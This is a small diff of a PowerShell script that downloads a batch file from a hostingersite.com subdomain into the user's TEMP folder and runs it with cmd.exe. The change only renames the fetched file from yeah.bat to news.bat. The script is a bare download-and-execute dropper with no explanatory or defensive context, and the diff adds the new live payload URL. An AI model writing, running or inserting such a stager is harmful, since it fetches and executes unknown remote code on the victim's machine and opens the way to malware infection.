@@ -1,5 +1,5 @@
-$batUrl = "https://mediumvioletred-mosquito-767246.hostingersite.com/yeah.bat"
-$batPath = "$env:TEMP\yeah.bat"
+$batUrl = "https://mediumvioletred-mosquito-767246.hostingersite.com/news.bat"
+$batPath = "$env:TEMP\news.bat"
 
 Invoke-WebRequest -Uri $batUrl -OutFile $batPath
 Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$batPath`""
